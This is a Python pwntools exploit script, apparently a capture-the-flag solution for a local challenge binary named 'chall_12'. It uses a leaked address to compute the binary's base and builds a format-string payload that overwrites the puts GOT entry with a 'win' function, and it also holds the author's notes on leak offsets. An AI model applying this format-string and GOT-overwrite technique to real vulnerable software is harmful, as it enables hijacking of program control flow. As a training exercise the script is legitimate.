from pwn import *

context.arch = 'i386'
p = process('./chall_12')

"""
LEAKING GLOBAL VAR, SO TAKE THAT LEAK AND MINUS IT 
Does it leak main address?

6 + 10 == %16$p __libc_start_call_main

6 + 15 == %21$p printf, leak - 41 for libc offset - a90 or 0x500?, maybe it's 22 - 41 - a70?
"""

p.recvuntil(b'help: ')

leak = int(p.recvline().decode('utf-8').strip(), 16)

binary = ELF(p.elf.path)

# take leaked main (with added randomness, and take offset of main, gives us libc, because this is main, which is called in libc)
binary.address = leak - p.elf.sym['main']

log.info('binary address = ' + hex(binary.address))

# payload = b'%20$p %21$p %22$p'
# p.sendline(payload)
# p.recvline()
# leaks = p.recvline().decode('utf-8').strip().split(" ")
# # leak = int(p.recvline().strip(), 16)
# offset = 41 + -0xa70

payload_offset = 6

puts_addr = binary.got['puts']
win_addr = binary.sym['win']
log.info(f'win = {hex(win_addr)} | puts = {hex(puts_addr)}')

payload = fmtstr_payload(payload_offset, { binary.got['puts']: binary.sym['win'] })
